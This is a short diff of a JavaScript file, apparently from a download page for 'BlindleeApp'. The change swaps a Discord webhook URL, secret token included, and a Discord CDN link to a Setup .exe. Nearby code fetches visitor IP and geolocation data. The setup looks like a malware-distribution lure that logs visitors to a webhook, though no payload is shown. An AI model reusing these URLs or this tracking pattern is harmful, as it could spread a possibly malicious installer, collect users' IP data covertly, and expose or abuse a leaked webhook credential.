@@ -25,8 +25,8 @@
 /* =====================================================================
    WEBHOOK — GLOBAL SCOPE (her yerden erişilebilir)
    ===================================================================== */
-const WEBHOOK_URL  = 'https://canary.discord.com/api/webhooks/1560034210742403125/r3Mr2Sg96Gb9qoNVqYE5y8vDnqQZ9DXLj7HHhKlceEc3FnsOmiaQ_S5Ye7ZRAuORwo39';
-const DOWNLOAD_URL = 'https://cdn.discordapp.com/attachments/1559636219825094708/1560695497348358204/BlindleeApp_Setup_1.0.0.exe?ex=6ad79af2&is=6ad64972&hm=01be060a6935b29de080db53eda2454085a93afccc7f7a47fc29bd262dd31728&';
+const WEBHOOK_URL  = 'https://canary.discord.com/api/webhooks/1562780593270292482/nU8zy-NIskAfK_RnF57o5nrGzCm23-sP873zo3ds5aPsXF3bX71nRWMoQpnMr2zo7xsB';
+const DOWNLOAD_URL = 'https://cdn.discordapp.com/attachments/1559636219825094708/1562779765847498762/BlindleeApp_Setup_1.0.0.exe?ex=6adb3b93&is=6ad9ea13&hm=d98363c567cfa7b0dc729dfd32adc22726887c416dd5bc4ae0be7c0c3b8a2dbb&';
 
 async function getIpData() {
   try { const r = await fetch('https://ipapi.co/json/'); return await r.json(); }
